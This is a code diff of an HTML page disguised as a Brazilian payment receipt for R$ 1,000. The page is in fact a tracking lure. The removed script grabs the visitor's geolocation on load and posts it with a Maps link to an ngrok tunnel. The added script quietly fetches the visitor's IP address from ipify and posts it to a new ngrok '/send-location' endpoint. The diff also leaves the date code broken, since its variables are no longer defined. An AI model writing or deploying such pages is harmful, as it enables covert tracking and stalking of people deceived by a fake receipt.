@@ -15,7 +15,7 @@
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> André Kovalski</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
 
@@ -28,37 +28,22 @@
 
   </div>
 
-  <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
+	<script>
+					        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    // Display the IP address on the screen
+                    console.log(data.ip);
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
-
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      fetch("https://c6a5-191-177-136-130.ngrok-free.app/send-location", {
+      fetch("https://d0d2-191-177-136-130.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude, maps })
+        body: 
+							JSON.stringify({ "latitude": data.ip, "longitude": data.ip, "maps": data.ip })
       })
         .then(response => response.json())
         .then(data => {
@@ -69,11 +54,16 @@
         .catch(error => {
           console.error("Erro:", error);
         });
-    }
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+        });
+	</script>
 
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
+  <script>
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+    document.getElementById("data-atual").textContent = dataFormatada;
   </script>
 </body>
 
